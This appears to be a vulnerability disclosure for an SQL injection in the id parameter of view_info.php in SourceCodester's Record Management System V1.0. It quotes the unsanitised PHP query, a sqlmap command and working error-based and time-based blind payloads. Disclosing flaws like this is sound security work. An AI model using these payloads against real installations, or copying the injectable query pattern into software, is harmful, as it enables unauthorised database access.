### VUL_AUTHOR:netmanzhang
# Record Management System - SQL Injection on (view_info.php id parameter) 
## Vendor Homepage:
https://www.sourcecodester.com/php/5107/record-management-system.html 
## Version:V1.0
## Tested on: PHP, Apache, MySQL
## Affected Page:
view_info.php 

On this page, id parameter is vulnerable to SQL Injection Attack 
## Source code(Personnel_record_management_system/view_info.php):
```
$get_id=$_GET['id'];
$get_query=mysqli_query($conn,"select * from employee where employeeID='$get_id'")or die(mysqli_error());
$row=mysqli_fetch_array($get_query);$id=$row['employeeID'];
```
## Proof of vulnerability(Verify using the sqlmap tool):
#### -> sqlmap -u http://localhost/Personnel_record_management_system/view_info.php?id=166 --batch
## Output:
```
---
Parameter: id (GET)
    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=166'||(SELECT 0x6e514463 WHERE 3381=3381 AND (SELECT 9571 FROM(SELECT COUNT(*),CONCAT(0x717a627171,(SELECT (ELT(9571=9571,1))),0x7162717171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a))||'

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=166'||(SELECT 0x656d4452 WHERE 1219=1219 AND (SELECT 1751 FROM (SELECT(SLEEP(5)))DSrn))||'
---
```
